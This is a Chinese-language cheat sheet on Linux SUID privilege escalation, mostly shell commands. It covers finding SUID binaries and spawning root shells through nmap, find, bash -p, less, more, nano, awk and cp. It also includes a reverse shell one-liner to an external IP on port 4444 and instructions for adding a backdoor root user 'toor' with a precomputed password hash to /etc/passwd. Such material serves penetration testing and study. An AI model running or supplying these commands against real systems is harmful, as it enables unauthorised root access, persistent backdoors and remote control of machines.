### Suid提权

SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。**但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.**



设置SUID

```shell
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置
```

以下命令可以找到正在系统上运行的所有SUID可执行文件。

```shell
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} 、;
```



**nmap:**

适用版本:nmap2.02至5.21在早期nmap版本中,带有交互模式,因而允许用户执行shell命令使用如下命令进入nmap交互模式:

```shell
nmap --interactive
# 交互模式下使用如下命令
nmap> !sh
sh-3.2# whoami
root
```

msf当中也有利用nmap进行提权的模块

```shell
exploit/unix/local/setuid_nmap
```



**find:**

find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。

```shell
touch anyfile #必须要有这个文件
find anyfile -exec whoami \;
```

```shell
#进入shell
find anyfile -exec '/bin/sh' \;
sh-5.0# whoami
root
```

反弹shell：

```shell
find anyfile -exec bash -c 'bash -i >& /dev/tcp/114.xxx.xxx.96/4444 0>&1' \;
```



**vim.tiny**

修改/etc/passwd添加root权限用户

格式：

用户名:密码:uid:gid:注释:home目录:用户的shell

密码部分为x，可以生成：

openssl passwd -1 -salt '12345678' 

hummer加密后如下：

$1$12345678$ix0nucj0z5H3gZoaHdFFq1

在/etc/passwd 中添加toor用户

toor:$1$12345678$ix0nucj0z5H3gZoaHdFFq1:0:0:root:/toor:/bin/bash



**bash**

```shell
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```



**less**

```shell
less /etc/passwd
#在less中输入:
!/bin/sh
```



**more**

```shell
more /etc/passwd
#在more中输入:
!/bin/sh
```



**nano**

```shell
nano #进入nano编辑器
Ctrl + R
Ctrl + X 
#即可输入命令
```



**cp**

使用cp 命令覆盖原来的`/etc/passwd`文件



**awk**

```shell
awk 'BEGIN {system("/bin/bash")}'
```

